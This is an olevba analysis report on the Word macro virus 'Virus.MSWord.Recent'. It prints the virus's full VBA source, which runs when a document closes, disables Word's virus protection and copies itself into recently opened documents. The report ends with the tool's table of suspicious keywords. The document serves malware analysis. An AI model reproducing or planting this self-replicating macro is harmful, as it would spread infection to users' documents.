olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Recent
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Recent - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
Application.WindowState = wdWindowStateMinimize
Set a = MacroContainer.VBProject: Options.VirusProtection = False
Set ab = a.vbcomponents(1): Set abc = ab.codemodule
For i = 1 To RecentFiles.Maximum
RecentFiles(i).Open
Dn = RecentFiles(1).Name
Set s = Documents(Dn): Set nh = s.VBProject.vbcomponents(1).codemodule
If nh.countoflines < 5 Then
nh.addfromstring abc.lines(1, abc.countoflines)
s.Save
End If
Next
If Day(Now()) = Int(Rnd * 31) + 1 Then MsgBox "¿Strife?", 64
Application.Quit
End Sub

Rem Another macro virus by Jack Twoflower LineZerØ/Metaphase
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

